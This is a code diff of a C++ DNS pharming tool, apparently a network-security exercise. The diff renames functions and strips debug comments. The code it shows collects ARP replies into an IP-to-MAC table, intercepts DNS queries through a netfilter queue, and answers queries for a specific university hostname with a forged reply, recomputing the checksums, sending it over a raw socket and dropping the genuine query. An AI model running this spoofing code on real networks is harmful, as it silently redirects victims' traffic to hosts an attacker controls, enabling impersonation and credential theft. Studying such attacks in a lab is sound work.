@@ -1,6 +1,5 @@
-#include "pharm_attack.hpp"
+#include "pharm_attack.h"
 
-// #define INFO 1
 #define MAC_LENGTH 6
 
 void handle_sigint(int sig) {
@@ -10,10 +9,9 @@ void handle_sigint(int sig) {
     exit(0);
 }
 
-void send_data_udp(char *data, int len, struct NFQData *info) {
+void sendUDPData(char *data, int len, struct NFQData *info) {
     // raw socket
     int fd;
-    // int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 0) {
         perror("socket()");
         return;
@@ -24,14 +22,6 @@ void send_data_udp(char *data, int len, struct NFQData *info) {
     std::vector<uint8_t> src_mac = info->info.src_mac;
     unsigned char my_mac[6];
     std::copy(src_mac.begin(), src_mac.end(), my_mac);
-    // dump ifidx, src_mac, my_ip
-    // printf("ifidx: %d\n", ifidx);
-    // printf("src_mac: ");
-    // for (int i = 0; i < 6; i++) {
-    //     printf("%02x ", my_mac[i]);
-    // }
-    // printf("\n");
-    // printf("my_ip: %s\n", inet_ntoa(info->info.src_ip.sin_addr));
 
     char *sendbuf = new char[1024];
     memset(sendbuf, 0, 1024);
@@ -47,10 +37,7 @@ void send_data_udp(char *data, int len, struct NFQData *info) {
     auto it = info->ip_mac_pairs.find(dest_ip_array);
     if (it != info->ip_mac_pairs.end()) {
         std::copy(it->second.begin(), it->second.end(), dest_mac);
-        // Now dest_mac contains the MAC address for dest_ip_array
     } else {
-        // Handle the case where dest_ip_array is not in the map
-        // Print destination IP
         printf("Destination IP: %d.%d.%d.%d not found in map\n", dest_ip_array[0], dest_ip_array[1], dest_ip_array[2], dest_ip_array[3]);
         return;
     }
@@ -60,13 +47,6 @@ void send_data_udp(char *data, int len, struct NFQData *info) {
     for (int i = ETH2_HEADER_LEN; i < len + ETH2_HEADER_LEN; i++) {
         sendbuf[i] = data[i - ETH2_HEADER_LEN];
     }
-
-    // dump
-    // for(int i=0;i<len+ETH2_HEADER_LEN;i++){
-    //     cout << hex << (unsigned)sendbuf[i] << ' ';
-    //     if(i%16 == 15) cout << '\n';
-    // }
-    // cout << '\n';
 
     struct sockaddr_ll sll;
     memset(&sll, 0, sizeof(struct sockaddr_ll));
@@ -97,7 +77,7 @@ void send_data_udp(char *data, int len, struct NFQData *info) {
     return;
 }
 
-void send_dns_reply(unsigned char *payload, int len, int qlen, struct NFQData *info) {
+void sendDNSReply(unsigned char *payload, int len, int qlen, struct NFQData *info) {
     char *data = new char[1024];
     for (int i = 0; i < len; i++) {
         data[i] = payload[i];
@@ -139,11 +119,10 @@ void send_dns_reply(unsigned char *payload, int len, int qlen, struct NFQData *i
     data[resp_mv + 3] = 241;
     resp_mv += 4;
 
-    // checksum calculation
-    // reference: https://bruce690813.blogspot.com/2017/09/tcpip-checksum.html
+    // checksum
     udph->len = htons(resp_mv - iph_len);
     udph->checksum = 0;
-    // calculate udp checksum
+    // udp checksum
     uint32_t sum = 0;
     // pseudo header
     sum += ntohs(iph->src_ip >> 16) + ntohs(iph->src_ip & 0xFFFF);
@@ -160,7 +139,7 @@ void send_dns_reply(unsigned char *payload, int len, int qlen, struct NFQData *i
     }
     udph->checksum = ~htons(sum);
 
-    // calculate ip checksum
+    // ip checksum
     iph->tlen = htons(resp_mv);
     iph->checksum = 0;
     sum = 0;
@@ -173,8 +152,7 @@ void send_dns_reply(unsigned char *payload, int len, int qlen, struct NFQData *i
     }
     iph->checksum = ~htons(sum);
 
-    // send data out
-    send_data_udp(data, resp_mv, info);
+    sendUDPData(data, resp_mv, info);
 }
 
 // Function to handle receiving responses
@@ -184,15 +162,14 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
     int saddr_len = sizeof(saddr);
 
     while (true) {
-        // Receive packet
-        int bytes = recvfrom(sockfd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
-        if (bytes < 0) {
+        int n;
+        if ((n = recvfrom(sockfd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len)) < 0) {
             perror("recvfrom() failed");
             exit(EXIT_FAILURE);
         }
 
-        // Check if packet is an ARP packet
-        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
+        // Check ARP packet
+        if ((buffer[12] == ETH_P_ARP / 256) && (buffer[13] == ETH_P_ARP % 256)) {
             parseARPReply(buffer, ip_mac_pairs, info);
         }
         memset(buffer, 0, IP_MAXPACKET);
@@ -200,7 +177,7 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
     }
 }
 
-std::string parse_dns_query(const unsigned char *packet, int dns_start, int &dns_name_length) {
+std::string parseDNSQuery(const unsigned char *packet, int dns_start, int &dns_name_length) {
     std::string dns_name;
     int dns_name_position = dns_start + sizeof(dns_hdr);
     dns_name_length = 5;  // Include qry.type, qry.class, and final 0 in qname
@@ -247,18 +224,18 @@ static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
     int dport = ntohs(udph->dest);
 
     if (dport != 53) {
-        return nfq_set_verdict(qh, ph->packet_id, NF_ACCEPT, 0, NULL);
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
     }
     int dns_name_length;
-    std::string dns_name = parse_dns_query(packet, iph_len + udph_len, dns_name_length);
+    std::string dns_name = parseDNSQuery(packet, iph_len + udph_len, dns_name_length);
     // printf("dns_name: %s\n", dns_name.c_str());
 
     if (dns_name != "wwwnycuedutw") {
-        return nfq_set_verdict(qh, ph->packet_id, NF_ACCEPT, 0, NULL);
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
     }
 
-    send_dns_reply(packet, len, dns_name_length, nfq_data);
-    return nfq_set_verdict(qh, ph->packet_id, NF_DROP, 0, NULL);
+    sendDNSReply(packet, len, dns_name_length, nfq_data);
+    return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
 }
 
 void NFQHandler(AccessInfo info, std::map<std::vector<uint8_t>, std::vector<uint8_t>> ip_mac_pairs) {
@@ -296,7 +273,7 @@ void NFQHandler(AccessInfo info, std::map<std::vector<uint8_t>, std::vector<uint
         exit(1);
     }
     fd = nfq_fd(h);
-    while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
+    while ((rv = recv(fd, buf, sizeof(buf), 0)) && (rv >= 0)) {
         nfq_handle_packet(h, buf, rv);
     }
     nfq_destroy_queue(qh);
@@ -313,7 +290,7 @@ int main(int argc, char **argv) {
     // Submit request for a raw socket descriptor.
     if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
         perror("socket() failed");
-        exit(EXIT_FAILURE);
+        exit(1);
     }
 
     sendARPRequest(sockfd, info);
@@ -350,5 +327,5 @@ int main(int argc, char **argv) {
     // Close socket descriptor.
     close(sockfd);
 
-    return (EXIT_SUCCESS);
+    return 0;
 }
